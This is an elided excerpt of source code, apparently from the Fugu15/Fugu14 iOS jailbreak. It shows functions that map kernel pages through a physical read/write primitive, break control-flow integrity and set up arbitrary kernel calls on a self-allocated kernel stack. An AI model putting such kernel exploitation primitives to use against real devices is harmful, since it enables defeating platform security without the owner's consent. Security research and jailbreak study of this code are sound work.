...
uint64_t mapKernelPage(uint64_t addr) {
    ...
    uint64_t virt = physrw_map_once(page);
...
bool breakCFI(uint64_t kernelBase) {
    ...
    uint64_t intStack = kmemAlloc(0x4000 * 4, false) + 0x8000ULL; // Four pages
    ...
    fugu15ExploitThread.gScratchMemKern     = kmemAlloc(0x8000, false);
    fugu15ExploitThread.gScratchMemMapped   = mapKernelPage(fugu15ExploitThread.gScratchMemKern);
    fugu15ExploitThread.gReturnValMemMapped = mapKernelPage(fugu15ExploitThread.gScratchMemKern + 0x4000) + 0x3FF8;
...
bool setupFugu14Kcall(void) {
    ...
    // Create a stack
    uint64_t stack = kmemAlloc(0x4000 * 4, false) + 0x8000ULL; // Four pages
    guard (stack != 0) else {
        puts("[-] setupFugu14Kcall: Failed to alloc kernel stack!");
        return false;
    }
    
    void *stackMapped = mapKernelPage(stack);
    ...
    fugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t) mapKernelPage(stack + 0x4000) + 0x3000ULL);
